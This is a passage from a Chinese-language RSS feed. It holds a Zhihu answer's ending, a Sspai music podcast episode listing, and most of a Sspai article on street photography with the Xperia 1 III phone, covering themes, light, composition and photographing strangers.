data-private-watermark-src=\"v2-7d2ac8df2bf41192615455e946e38c74\"></p>\n<p>正是建立在这样的信念上，那个红银相见的巨人出现在了荧幕上，并成为了一代又一代孩子的童年记忆。我们的奥特曼，来了！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/kazamori-masaki?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">风森正辉</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/265413321/answer/1996395962?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">38 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/335062212?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">除了初代以外的哪个奥特曼更能代表奥特曼系列？</a><br><a href=\"http://www.zhihu.com/question/29112455?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何单凭脸部来分辨初代、杰克和佐菲三个奥特曼？</a><br>\n","link":"http://www.zhihu.com/question/265413321/answer/1996395962?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"FM3.14｜音乐最近听什么 EP04：一些可能适合夏夜的专辑","date":"2021-07-18 11:01:48","description":"\n<p>虽迟但到，最近正职有点忙，即便周末也是疯狂加班，幸好还是在周末之内赶出来了～最近的心情很夏天，所以介绍几张感觉应该比较适合夏天各种心情听的专辑。因为前两天看了《草莓星球来的人》，所以也借题发挥聊了聊很喜欢的《东莞》这首歌以及八十年代香港电子舞曲。希望大家喜欢～</p>\n<div class=\"ss-audioSource\" src=\"https://r.typlog.com/eyJzIjoxOTQ2LCJlIjo4NTk2LCJwIjoyLCJ1IjoiNzg4NC5tcDMifQ.VL0FmP__1dodYFsBLx-b_UrD6C0/fm314/8373396344_137884.mp3\" title=\"FM3.14｜音乐最近听什么 EP04：一些可能适合夏夜的专辑\" cover=\"https://cdn.sspai.com/2021/07/18/5e18d95100fd79f14792645aa2fe8353.jpg\" artist=\"挨石\" chapter='[{\"name\": \"00:00 Intro：东莞 - 白纸扇\", \"time\":0}, {\"name\": \"03:02 东莞以及一些香港舞曲\", \"time\":182}, {\"name\": \"10:20 春田花花幼稚园校歌\", \"time\":620}, {\"name\": \"10:40 的士高音乐的一些回忆\", \"time\":640}, {\"name\": \"12:04 裸泳 - 钟舒祺\", \"time\":724}, {\"name\": \"13:29 海外音乐对于八十年代香港的影响\", \"time\":809}, {\"name\": \"15:47 《暴风一族》前奏 - 张国荣\", \"time\":947}, {\"name\": \"16:31 大舌头的古怪音乐人 Boys Age 和他名字的由来\", \"time\":991}, {\"name\": \"17:09 The Ghost - Boys Age\", \"time\":1029}, {\"name\": \"18:17 大贯妙子的不插电专辑《pure acoustic》\", \"time\":1097}, {\"name\": \"23:06 若き日の望楼 - 大贯妙子\", \"time\":1386}, {\"name\": \"24:35 低频试音代表 Massive Attack\", \"time\":1475}, {\"name\": \"25:21 Angel - Massive Attack\", \"time\":1521}, {\"name\": \"28:22 慵懒帅气的 rapper 大包子\", \"time\":1702}, {\"name\": \"32:09 纯白之夜 - 大包子\", \"time\":1929}, {\"name\": \"33:36 不是很开心的开心猫仔 happy little cat\", \"time\":2016}, {\"name\": \"34:59 exhale - happy little cat\", \"time\":2099}, {\"name\": \"38:04 来自日本乐队 Regal Lily 的星夜歌单\", \"time\":2284}, {\"name\": \"40:02 Outro：星降る夜になったら - fujifabric\", \"time\":2402}]'>Audio</div>\n<p> </p>\n<h2><strong>🎵 相关链接</strong></h2>\n<p>Regal Lily 的歌单《<a href=\"https://open.spotify.com/playlist/09R5syD377dYPHoVH521pT?si=9a9c1dc860f44574\">ポケットのほし</a>》</p>\n<h2><strong>📻 订阅节目</strong></h2>\n<ul>\n<li><a href=\"https://fm314.typlog.io/episodes/feed.xml\">RSS 地址</a></li>\n<li><a href=\"https://podcasts.apple.com/cn/podcast/id1492046083\">Apple 播客</a></li>\n<li><a href=\"https://open.spotify.com/show/5dLciVkSqhvaVRUcYuKxZX\" target=\"_blank\">Spotify</a></li>\n<li><a href=\"https://www.xiaoyuzhoufm.com/podcast/5e3d212c418a84a046197d10?s=eyJ1IjoiNWU3YzlhYjlhMmYyZTUwM2NlYzNjZDcwIn0%3D%0A\">小宇宙</a></li>\n</ul>\n<p>感谢聆听，也欢迎大家留言交流、分享音乐，对节目有任何建议也欢迎提出～下期见！</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67771"},{"title":"从 Xperia 1 III 影像体验到手机街头摄影","date":"2021-07-18 06:04:07","description":"\n<p>在去年 <a href=\"https://sspai.com/post/63334\" target=\"_blank\">Xperia 1 II 体验报告</a> 的结尾，我曾立下了「下一部我还会支持」的 flag。随着新一代 Xperia 1 的上市，我第一时间就下了单，成为 Xperia 1 III 量产版的首批用户，成功实现了承诺。</p>\n<p>但在拿到新机之前，我就一直在思考这样一件事：面对这样一部试图进一步拉近手机与相机拍摄体验距离的设备，我真的要像市面上的大部分手机测评一样，拍拍样张、写写体验，给出一个结论然后收工大吉吗？</p>\n<p>不。既然 Xperia 1 III 是一部主打影像体验的手机，那我就应该以摄影的方式看待这款产品。在这篇文章中，我的目标不再是「测试手机拍照体验」这么简单。在过去的一个多月里，我每周都会带着 Xperia 1 III——以及其它拍摄设备——走上街头，进行我喜爱的街头摄影。借助这个过程，我想顺便和你聊聊与手机街头摄影有关的林林总总。</p>\n<p><strong>注：</strong>关于摄影的基础知识与技法，请阅读会员文章《<a href=\"https://sspai.com/prime/story/vol01-travel-photography\" target=\"_blank\">长途跋涉得返璞归真——旅行摄影创作指南</a>》。摄影师陳川端在文中的讲解专业且详细，值得摄影爱好者——特别是摄影新人——认真研究。</p>\n<h2>第一章：摄影、街头、手机</h2>\n<h3>为什么要玩街头摄影？</h3>\n<p>街头摄影（Street Photography）脱胎于纪实摄影（Documentary Photography）。自人类发明摄影术以来，摄影术就承接了绘画的纪录作用，并被迅速应用于新闻领域。在随后的发展中，徕卡公司（Leica）推出了轻便的 135 mm 相机，让摄影师们可以将相机带进城市的街头巷尾，带进社会事件的历史现场，带进平民百姓的日常生活，街头摄影也由此应运而生，成了纪实摄影的重要分支。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/b8fa84961dc9d92e2f00fa5662dba356\" alt=\"Video: The story of Oskar Barnack, the inventor of the original Leica -  Australian Photography\"><figcaption>初代徕卡原型机及其发明者 Oskar Barnack，图片来自 australianphotography.com</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/491e224a88b58976a247bd98aa160d58\"><figcaption>©Henri Cartier-Bresson</figcaption></figure><p>直到今天，关于街头摄影的定义都没有一个明确的边界，但只要提起这个词汇，许多人的脑中还是能产生关于它的画面——光影、构图、巧合、冲突等等。相应地，那些大师们响亮的名字——Henri Cartier-Bresson、Vivian Maier、Robert Frank、Elliot Erwitt、Lee Friedlander、Saul Leiter 等——也会一并涌上心头。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/53e284686ed4d3f336d9e3ff2b215964\" alt=\"Saul Leiter: Early Color 2005 2006 howard greenberg gallery\"><figcaption>©Saul Leiter</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/dabf6b33aedaa447c092fa114c2ae988\" alt=\"St. Petersburg, Florida\"><figcaption>©Robert Frank</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/4ea5628b83fb0d416ae2d76eb0fa1cf4\"><figcaption>©Josef Koudelka</figcaption></figure><p>不过，无论如何定义街头摄影，「街头」都是这项艺术绕不开的范畴。在拍摄的同时，你需要走街串巷，一边用双脚丈量城市的长度，一边用双眼观察周边的人和事物。即使一天下来没拍到好照片，这种游逛与观察依然可以带给你充实与满足感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/4fe32375283dec7f29eabd2397e7129b\" alt=\"VM19XXW03457-07-MC\"><figcaption>©Vivian Maier</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/2ed526b1133cbe9042d2311c1eb19e25\" alt=\"280. COL1976_15-02-17.jpg\"><figcaption>©Joel Meyerowitz</figcaption></figure><p>与此同时，正因为街头摄影脱胎于纪实摄影，「纪实」就成了街头摄影的底色与魅力所在——走上街头，留心观察发生在身边的人物和事件，按下快门留住各种瞬间，这种追随和纪录带来的快感无法用其它任何摄影形式取代。</p>\n<h3>为什么是手机街头摄影？</h3>\n<p>人人出门都会带手机，其随身属性与街头摄影的随机性天然契合。大部分人都不会天天背着相机逛街，但有趣的画面却时刻有可能出现。当相机不在手边时，拿起手机拍照就成了最自然的选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/05dc36a0eddcbddfb7c5c7d69d840d2b.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><p>近年来，手机影像技术大幅进步，多焦段镜头、复杂计算摄影等相继出现在手机上，这也让手机在部分场景下的成像能力和拍摄体验有机会接近传统相机。加上其无可比拟的方便性，手机街头摄影逐渐成为「街头摄影」这个概念下一个愈加明确的子集。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/d97851d5ee749fc29f190a57d45f65bc.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><p>经过我的拍摄实践，手机在许多情景下也可以成为街头摄影的利器。特别是在体验 Xperia 1 III 期间，我专门用它拍摄了不少街头摄影作品，也对手机街头摄影有了更深的体会。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/fa1476d1c2fe51daef2520833516a54a.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><p>街头摄影最常用到的相机焦段是经典的 28 mm、35 mm 和 50 mm，绝大多数知名街头摄影作品都是使用这三个焦段拍摄的。但不巧的是，几乎没有手机为街头摄影专门设计，除了小部分手机有 50 mm 镜头外，大部分手机的预置焦段都更偏向拍摄风光片。尤其近两年，手机厂商们发力的重点都是 20 mm 以内的超广角镜头。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/42db94d7ca54460dd225a5ea6b0ecaf0.jpg\"><figcaption>使用 OPPO Find X3 Pro 拍摄</figcaption></figure><p>不过，许多手机镜头画质最好的主摄都在等效 26 mm 左右（譬如 iPhone、OPPO Find X3 系列、Samsung Galaxy S21 系列等），其焦距与 28 mm 非常接近，所能得到的画幅也类似，可以善加利用。另外一些手机（譬如 Xperia 1 III、Xiaomi 11 Ultra 等）的主摄为等效 24 mm，取景范围和 28 mm 相差略大，需要适应和调整。</p>\n<p>如果你此前已有使用相机的街头摄影的经验，在拿起手机上街时，需要改变自己的拍摄习惯，特别是建立新的构图预判。</p>\n<h2>第二章：街头摄影可以拍什么？</h2>\n<p>「街头摄影可以拍什么？」是一个值得在走上街头前思考的问题。许多人都习惯漫无目的地乱拍一通，导致最终的成品也缺少核心表达。街头摄影当然不需要每张作品都表达什么深刻思想，但如果总拍主题空洞、只有画面的作品，会让自己的摄影能力永远局限于某个圈子中。</p>\n<h3>街头摄影也是有主题的</h3>\n<p>在许多人的概念里，「街头摄影」几乎等同于「街头瞎拍」。尤其拿起手机走上街头时，如果没有拍摄方向，很有可能真的完全不知道该把镜头对准哪里。</p>\n<p>其实，认为「街头摄影等于无主题摄影」是一个巨大的误解。想把街头摄影玩好，设定主题非常重要。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/7f90e60f7376db04b0014a9cd0a67d31.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><p>在互联网时代，人们习惯以单张的方式浏览照片，由此认为摄影创作也是以单张为单位进行的，但其实不然。从摄影发展至今，「项目」和「主题」一直都是引导摄影师们成长和成名的主线。</p>\n<p>「主题」在摄影中可以以多种形式呈现，它可以是某种事物（譬如「街边的垃圾桶」）、某种人物（譬如「奔跑的小朋友」）、某种概念（譬如「深圳精神」）、某种时空联系（譬如「家乡的四季」）、某种拍摄技法（譬如「寻找对称」）等等——和写作、绘画、音乐等其它艺术创作一样，摄影的主题既可以具象也可以抽象，你的创作过程就是将这些关键词或元素串联在一起，并寻找那些与主题相关联的画面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/18b54cc95b8f02593cb329c4a81c8596.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><p>在没有特定想拍的主题时，我会有一个宽泛且恒定的拍摄对象——有趣的人们。我喜欢街头摄影的原因就是喜欢通过镜头观察各种各样的人类，所以即使我只打算随便拍拍，也会选择人多的地点，并把注意力放在身边的人身上。选择一个万能备选主题也是个不错的方式，它能帮助你在任何环境下都有一个大致的拍摄方向。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/7b6e85b90eb988570bc9d7774274eaa7\"><figcaption>©Elliott Erwitt</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/fe1230162e71d3f2a653932bbd41a5fc.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/f63bcf299fe8c736138affb08ed54c90.jpg\"><figcaption>使用 RICOH GR III 拍摄</figcaption></figure><p>如果你想专门练习主题拍摄却不知从何下手，我推荐你阅读英国摄影师 Brian Lloyd Duckett 撰写的 <i>52 Assignments: Street Photography</i>（大陆译名《<a href=\"https://book.douban.com/subject/35187725/\" target=\"_blank\">街头摄影：52 个任务清单</a>》，有中文版）。Brian 在书中从不同方向提出了 52 个拍摄主题，其中包含大量对拍摄技巧的专项练习（如明暗关系、线条、剪影、构图等）。跟着这些主题，可以在快速提升拍摄技巧的同时，收获观察城市和人物的全新视角。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/c972b3554aede1b1e13286c6206eb7f7.jpg\"><figcaption>©Ana Cichowicz</figcaption></figure><p>当然，如果你觉得买书还要等，而你现在就想上街开拍，我也为你准备了 10 个马上就能拍的有趣主题。除了主题本身，所有关于主题的资讯和解读都由你完成，请不要限制自己，尽情放飞想象，并走上街头拍摄吧。</p>\n<ol>\n<li>假如这世界没有手机</li>\n<li>南方的冬天</li>\n<li>我没能看到他的脸</li>\n<li>一阵风</li>\n<li>下午五点半</li>\n<li>藏</li>\n<li>心情不佳</li>\n<li>一个人，不孤单</li>\n<li>如果有一天，我变得很有钱</li>\n<li>虚惊一场</li>\n</ol>\n<h3>画面与内容</h3>\n<h4>光影、色彩与构图</h4>\n<p>光影、色彩和构图是摄影的基础，也是考验摄影师基本功的部分。在许多时候，即使没有故事可拍，纯粹的光影组合依然能构成好看的画面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/ad7c54d98ad3775c6ee07d363ecb877d.jpg\"><figcaption>使用 SONY α6300 拍摄</figcaption></figure><p>通常来说，日出后的两三个小时（早晨七点到十点）以及日落前的两三个小时（下午四点到七点）是更容易拍出光影效果的时段，因为在这两个时段中，阳光斜射地面，人和物体都会拖出长长的阴影，更容易产生好看的构图。美国摄影师 Alex Webb 就曾多次谈及自己的拍摄方式——每天很早起床，先拍到半中午，然后休息和吃饭。到了大下午再继续拍，直到太阳落山。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/3b8f04412be2953694a7ee213bfe6761\"><figcaption>©Alex Webb</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/87b466a0d126c191d4b8beb36f00a269.jpg\"><figcaption>使用 RICOH GR III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/3c948f9541afacb3f9b38c5afd72fdfa.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><p>在实际拍摄中，阳光会根据地理位置、季节、天气等原因而有很大变化，需要酌情考量。另外，手机通常都会默认开启 HDR 合成算法，如果你想刻意保留画面里的大光比效果，要记得拍摄前将该功能关闭。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/4e38ff9f93860f93301f09491a7f3506.jpg\"><figcaption>使用 RICOH GR III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/a86a67649eacd74d069395d21ba5c8f5.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/b23d07316628fc7ec754c273d7adb5ca.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/ad1e13b35d9c16d09642d872b6046f0f.jpg\"><figcaption>使用 iPhone 11 Pro Max 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/45e908e3b2cdddbf77801f6dfc3ff59f.jpg\"><figcaption>使用 Fujifilm X100V 拍摄</figcaption></figure><p>能把光影、色彩与构图拍好固然好看，但作为摄影的基础，这些元素还需要有生动的故事作为支撑。只有好画面却没有好内容的照片更像是新手习作，看多了不免令人厌腻，就像总吃糖分很高的水果，终究会因为太甜而吃不下去。不过，纯粹的光影、色彩和构图练习仍是摄影初学者快速提升水平的绝佳方式。摄影作为一项光的艺术，能把光影、色彩和构图做好，依然可以打动观众。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/0afef7bf13ea286e6ef26861ab3a1c8f.jpg\"><figcaption>使用 RICOH GR III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/1bd6f6e236b8f5c7fb67513fac95dc63.jpg\"><figcaption>使用 RICOH GR III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/b57e642bbe0d36a6c9947a7bb5f79c35.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/03170fdca7eb5ca944add8f873fa3b59.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/6455ed01e9b8e5b2b0054e35d050e84c.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><h4>人物百态</h4>\n<p>人物永远是纪实摄影的核心主题之一，也是街头摄影的故事主角。大街上的人物形形色色，纪录和抓取他们的百态也充满了乐趣与挑战。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/d56484080d1b41246a3d01ce0f9aae68.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/894194302c9abc910811302abbc5c1ec.jpg\"><figcaption>使用 Xperia 1 II 拍摄</figcaption></figure><p>主流观点认为，拍摄人物应该以「不打扰人物活动」为前提，因此，摄影师要尽量以观察者的身份拍照，避免让主体人物察觉到相机的存在。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/7a12dd73fbf0cca58d39dee95f6bbe54.jpg\"><figcaption>©Richard Sandler</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/7f593c326b701c0f2c0bd709c2e364fc.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/8c452f56c1d766e316c2e5c998a468b5.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/7949e08aaa63a4135b4996211a8ee269.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/e549dc6957ab5f3fca15aaf3c81a4a97.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/f8bbc1cb74e0f1b0e1ed4e47486f2dbe.jpg\"><figcaption>画面里的小男孩被树枝划破了腿，很不坚强地哭了起来。我先按下快门拍到了照片，才掏出纸巾让小女孩帮他擦拭伤口</figcaption></figure><p>但这个观点不是什么牢不可破的黄金定律。相反，「主动让路人面对镜头，然后纪录其影像」也是一种不错的拍摄方式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/e4459ccd20d6e0dd3e7b748d3027fb14.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/3777fc9a8f916d2069c5935ae117e31f.jpg\"><figcaption>使用 iPhone XS 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/0568f571852a4a7c30a6ef7b4f8e30b5.jpg\"><figcaption>使用 RICOH GR III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/2df10a860aa84ef149344c07e2cd4b94.jpg\"><figcaption>使用 Xperia 1 II 拍摄</figcaption></figure><p>美国摄影师 <a href=\"https://www.youtube.com/watch?v=kkIWW6vwrvM\" target=\"_blank\">Bruce Gilden 的拍摄方式</a> 就很激进且具有代表性——他会一手拿着相机，另一手拿闪光灯，突然走到路人面前并按下快门，专门纪录人们被闪光灯闪到时的表情。在拍摄完成后，Bruce 则会向路人道歉和致谢。多数时候，人们都会原谅 Bruce，甚至微笑示好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/453786c54a943377c74e7602db98a9c3.jpg\"><figcaption>©Bruce Gilden</figcaption></figure><p>在为相机品牌富士拍摄 <a href=\"https://www.bilibili.com/video/BV1m7411n72c\" target=\"_blank\">X100V 广告片</a> 时，日本摄影师铃木达朗（Tatsuo Suzuki）也采用了类似的「㨃脸」拍摄手法。铃木达朗会在路人面前突然掏出相机，拍摄他们惊讶、恐惧、厌恶或冷漠的表情。广告片播出后引发了巨大争议，导致富士被迫与铃木达朗解约，双方取消了合作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/785b5c51b3dff46e9b8ca80f9e3341b7.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/6e70223c537ef8b9b449c81c50da150f.jpg\"><figcaption>©鈴木達朗</figcaption></figure><p>当然，以上两个例子不是鼓励你拿着手机「㨃脸」，或者在拍摄中冒犯被摄者，而是说明在街头拍摄人物的诸多可能。距离被摄人物更近可以让表情、动作、情绪等细节更为明确且生动，如果你打算拍摄人物，就不要畏惧与人接触，大胆靠近吧。</p>\n<h4>冲突、趣味与巧合</h4>\n<p>街头永远充满了各种冲突、趣味和巧合，这些突然冒出来的人物、场景和画面会让你的照片妙趣横生。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/6cfea2cd3793072b5368536ae422ddaf.jpg\"><figcaption>©Masoud Mirzaei</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/d7c01574ef8d9dd06b9721a5d0780a4f.jpg\"><figcaption>使用 RICOH GR III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/09c95f02bd564ae165e843d7f465e711.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><p>拍摄街头幽默的代表人物无疑是英国摄影师 Martin Parr，他也是我最喜欢的街头摄影师之一。在他的诸多经典作品中，中国观众最熟悉的可能是那幅《比萨斜塔》（The Leaning Tower of Pisa）。照片里，游客们都想摆出「手托斜塔」的样子，站在局外人的视角来看，这种集体「摆 pose」的行为十分滑稽。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/53f327a586ab762532f3b79970b38b96.jpg\"><figcaption>©Martin Parr</figcaption></figure><p>不过，Martin Parr 不是只拍街头幽默，他还有其它主题更深刻、拍摄手法更严肃的摄影项目。在 Martin Parr 的作品中始终贯穿着对人的冷静观察以及淡淡的温情，这也是他的作品打动人的关键因素。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/article/fe1de887494680d149e20b5c5bd58e09\" alt=\"Martin Parr • Life&amp;#39;s a Beach • Magnum Photos\"><figcaption>©Martin Parr</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/263bb031a9c30cfec85f1ba66945f94d.jpg\"><figcaption>©Rebecca Weston</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/6c283c90dbbecf6312f380a0d1692347.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/96d2568c53ad76dbde981d458d9f7516.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/ca0a2b8be183a4b543d86b1ee9bbcae3.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/4e9113068b2f2696c0f6a1679447bace.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/35f256592b347520d62179de4796f1e6.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><p>说到巧合，就不得不提到鼎鼎大名的摄影理论「决定性瞬间」，许多街头摄影爱好者都将 Cartier-Bresson 的这套理论奉为圭臬，常常挂在嘴边。然而，「决定性瞬间」的诞生带有诸多偶然乃至误会，Cartier-Bresson 本人对「决定性瞬间」的解读也和如今的坊间传言有着诸多不同（下文会具体谈及）。总而言之，想在街头捕捉更多戏剧性的瞬间，最重要的是不断走上街头，不要停下按动快门的手。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/8922f3c15599e77993f5d0b0c43b2b21\"><figcaption>©甜食</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/f9ab131842d0222767b470d4a554ee91.jpg\"><figcaption>©Tavepong Pratoomwong</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/c6c335dbddeb906dce7e2391d425c194.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"ss-imgRows\" figcaption=\"使用 Xperia 1 III 拍摄\"><img src=\"https://cdn.sspai.com/2021/07/08/d19236c6f0ca24bf8ce9905fae11edfa.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/08/04328d083dd0a8ed9a7e137833f510b4.jpg\" alt=\"\"></figure><h2>第三章：以摄影的方式看待手机摄影</h2>\n<p>手机影像技术的发展让更多人接触乃至爱上摄影艺术，但也导致许多人对摄影的认知也局限在了手机摄影中，尤其被框定在了由各个手机厂商引导、宣传乃至营造的各种概念中。在这个部分，我主张每个人都应该以摄影的方式看待摄影，当然也包括手机摄影。</p>\n<h3>别执着于画质</h3>\n<p>「执着于画质」是许多手机摄影爱好者的「常见病」。尤其在如今的大环境下，手机厂商乐于强调拍摄画质，每场手机发布会上，各种参数、术语和算法都是厂商们反复宣传的重点。与此同时，各路科技自媒体也形成了固定的评测套路，对比画质、对比夜景降噪算法等都成为手机评测中不可或缺的环节。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/610a8145ab99c88c0e337b13543134c1.png\"><figcaption>手机评测里常见的对比环节</figcaption></figure><p>然而，在街头摄影——乃至整个纪实摄影——范畴内，画质从来都不是决定作品水平的关键因素。当你翻看一张一九六〇年代拍摄的、充满了胶片噪点的，甚至焦点都没对准的照片，它的画面依然可能打动你。事实上，类似这种情况的经典作品比比皆是，人们却从未因为画质粗糙而否定画面里的故事。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/441794c8de8c3f94a3ec4876ab8b25ac\"><figcaption>©Henri Cartier-Bresson</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/43722c1f1ed8965c42961a91e036ea2a\" alt=\"Man Carrying Box (1959)\"><figcaption>©何藩</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/07c9b204c26c19738db3c09b883cb821\" 